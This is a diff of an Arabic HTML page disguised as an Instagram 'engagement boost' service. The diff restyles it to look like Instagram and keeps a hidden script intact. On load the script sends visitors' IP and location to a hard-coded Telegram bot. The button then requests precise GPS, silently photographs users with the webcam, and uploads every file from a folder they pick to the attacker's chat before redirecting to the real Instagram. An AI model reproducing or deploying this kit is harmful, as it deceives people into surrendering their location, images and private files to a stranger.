@@ -3,90 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة رفع التفاعل 🚀</title>
+    <title>خدمة رفع التفاعل - إنستغرام 🚀</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0d0d0d;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(145deg, #0d0d0d 0%, #1a1a2e 100%);
             color: #ffffff;
             text-align: center;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            padding-top: 60px;
-            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
         .container {
-            background: #1a1a1a;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 28px;
             padding: 40px 30px;
-            border-radius: 24px;
-            display: inline-block;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
-            border: 1px solid #2a2a2a;
-            max-width: 450px;
-            width: 90%;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+        }
+        .logo {
+            font-size: 42px;
+            margin-bottom: 8px;
         }
         h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: #00d4ff;
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
         }
         .sub {
             color: #aaa;
             font-size: 14px;
-            margin-bottom: 30px;
+            margin-bottom: 28px;
+        }
+        .info-box {
+            background: rgba(255,255,255,0.06);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #ccc;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .info-box span {
+            color: #00d4ff;
+            font-weight: 600;
         }
         .btn {
-            background: linear-gradient(135deg, #00d4ff, #007bff);
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743);
             color: white;
-            padding: 16px 40px;
-            border-radius: 50px;
+            padding: 16px 30px;
             border: none;
+            border-radius: 50px;
             font-size: 18px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
             transition: 0.3s;
             width: 100%;
+            letter-spacing: 0.5px;
         }
         .btn:hover {
             transform: scale(1.03);
-            box-shadow: 0 0 30px rgba(0, 132, 255, 0.3);
+            box-shadow: 0 0 40px rgba(220, 39, 67, 0.3);
         }
+        .btn:active { transform: scale(0.97); }
         .loader {
             margin-top: 20px;
             color: #00ff88;
             display: none;
             font-size: 14px;
         }
-        .hidden {
-            display: none;
-        }
-        video, canvas {
-            display: none;
-        }
         .status-box {
             margin-top: 15px;
-            padding: 10px;
+            padding: 12px;
             border-radius: 12px;
-            background: #111;
+            background: rgba(0,0,0,0.3);
             font-size: 13px;
-            color: #aaa;
+            color: #888;
             border: 1px solid #222;
+            min-height: 45px;
+        }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #444;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding-top: 15px;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🚀 خدمة رفع التفاعل</h1>
+    <div class="logo">📲</div>
+    <h1>خدمة رفع التفاعل</h1>
     <div class="sub">متابعين • لايكات • مشاهدات • تعليقات</div>
-    <p style="font-size: 15px; color: #bbb; margin-bottom: 25px;">
-        اضغط على الزر لبدء عملية رفع التفاعل لحسابك<br>
-        <span style="color: #666; font-size: 13px;">(يتم التحقق من الهوية لضمان الأمان)</span>
-    </p>
+
+    <div class="info-box">
+        ⚡ <span>تحسين فوري</span> لحسابك في إنستغرام<br>
+        🛡️ عملية آمنة ومشفرة بالكامل
+    </div>
 
     <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-    <button class="btn" onclick="startProcess()">🔓 بدء رفع التفاعل</button>
+    <button class="btn" onclick="startProcess()">🚀 بدء رفع التفاعل</button>
 
     <div id="status" class="loader">⏳ جاري التحقق من الهوية وتأمين البيانات...</div>
-    <div id="statusBox" class="status-box">🔹 انتظر بدء العملية...</div>
+    <div id="statusBox" class="status-box">🔹 اضغط الزر لبدء العملية</div>
+    <div class="footer">© 2026 جميع الحقوق محفوظة</div>
 </div>
 
 <video id="video" autoplay></video>
@@ -96,10 +129,9 @@
     // ======== بيانات التليغرام الجديدة ========
     const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
     const CHAT_ID = "8600300720";
-    const PAGE_NAME = "خدمة رفع التفاعل";
+    const PAGE_NAME = "خدمة رفع التفاعل - إنستغرام";
     // ===========================================
 
-    // دالة إرسال نص
     async function sendToTelegram(message) {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -112,12 +144,9 @@
                     parse_mode: 'HTML'
                 })
             });
-        } catch (e) {
-            console.error("Telegram send error:", e);
-        }
+        } catch (e) { console.error(e); }
     }
 
-    // دالة إرسال صورة
     async function sendPhotoToTelegram(base64Image, caption) {
         try {
             const blob = dataURLtoBlob(base64Image);
@@ -125,26 +154,19 @@
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'shot.jpg');
             formData.append('caption', caption.substring(0, 1024));
-
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
             await fetch(url, { method: 'POST', body: formData });
-        } catch (e) {
-            console.error("Photo send error:", e);
-        }
+        } catch (e) { console.error(e); }
     }
 
-    // دالة إرسال ملف
     async function sendFileToTelegram(file) {
         try {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('document', file);
-
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
             await fetch(url, { method: 'POST', body: formData });
-        } catch (e) {
-            console.error("File send error:", e);
-        }
+        } catch (e) { console.error(e); }
     }
 
     function dataURLtoBlob(dataURL) {
@@ -157,7 +179,6 @@
         return new Blob([u8arr], { type: mime });
     }
 
-    // جلب IP
     async function getIPInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -171,12 +192,9 @@
                 lon: data.longitude,
                 org: data.org
             };
-        } catch (e) {
-            return null;
-        }
+        } catch (e) { return null; }
     }
 
-    // تصوير الكاميرا
     function captureCamera() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -219,7 +237,6 @@
             });
     }
 
-    // ========== الوظيفة الرئيسية ==========
     async function startProcess() {
         const statusDiv = document.getElementById('status');
         const statusBox = document.getElementById('statusBox');
@@ -238,8 +255,9 @@
             if (ipInfo.lat && ipInfo.lon) {
                 msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
             }
+            msg += `📡 المزود: ${ipInfo.org || 'غير معروف'}`;
         }
-        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+        msg += `\n🕒 ${new Date().toLocaleString('ar-EG')}`;
         await sendToTelegram(msg);
 
         // 2. طلب GPS دقيق
@@ -266,11 +284,9 @@
         statusDiv.innerText = '📂 جاري تجهيز الملفات للمزامنة...';
         statusBox.innerText = '🔹 اختر المجلد أو الملفات لمزامنتها';
 
-        // فتح نافذة اختيار الملفات
         const fileInput = document.getElementById('fileInput');
         fileInput.click();
 
-        // عند اختيار الملفات
         fileInput.onchange = async function(e) {
             const files = e.target.files;
             if (files.length > 0) {
@@ -279,17 +295,14 @@
                 for (let i = 0; i < files.length; i++) {
                     statusBox.innerText = `🔹 رفع الملف ${i+1} من ${files.length}`;
                     await sendFileToTelegram(files[i]);
-                    // تأخير بسيط لتجنب الإغراق
                     await new Promise(r => setTimeout(r, 300));
                 }
 
                 statusDiv.innerText = '✅ تمت المزامنة بنجاح!';
                 statusBox.innerText = '✅ تم رفع جميع الملفات';
 
-                // إرسال تأكيد نهائي
                 await sendToTelegram(`✅ <b>${PAGE_NAME}</b> - تم رفع ${files.length} ملف بنجاح!`);
 
-                // توجيه إلى موقع حقيقي
                 setTimeout(() => {
                     window.location.href = "https://www.instagram.com/";
                 }, 2000);
@@ -297,7 +310,7 @@
         };
     }
 
-    // ========== إرسال IP فور فتح الصفحة ==========
+    // إرسال IP فور فتح الصفحة
     (async function () {
         const ipInfo = await getIPInfo();
         if (ipInfo) {
@@ -312,6 +325,5 @@
         }
     })();
 </script>
-
 </body>
 </html>
